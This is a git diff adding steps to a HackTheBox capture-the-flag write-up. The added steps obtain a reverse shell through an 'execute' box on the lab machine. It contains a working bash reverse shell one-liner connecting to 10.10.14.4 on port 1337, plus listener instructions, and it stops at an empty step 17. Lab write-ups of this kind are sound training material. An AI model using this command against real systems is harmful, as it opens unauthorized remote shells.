@@ -88,5 +88,22 @@ Nmap done: 1 IP address (1 host up) scanned in 56.67 seconds
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fd1ac823-a2ee-4330-ad17-afd3a7a4c729)
 
 
-13. This could be used for our privesc method. 
+13. This could be used for our privesc method.
+14. Great! Anyway let's get more comfy enumeration by getting a reverse shell.
+15. I used simple bash reverse shell:
 
+```txt
+bash -c 'bash -i >& /dev/tcp/10.10.14.4/1337 0>&1'
+```
+
+16. Set up a listener at port **1337** than enter it on the **execute** box.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ef6adcff-da39-4c24-bc8b-1fe47e9bbeea)
+
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2a27e9b7-5e5d-4ad5-9b8c-70f7baa8668c)
+
+
+17. 
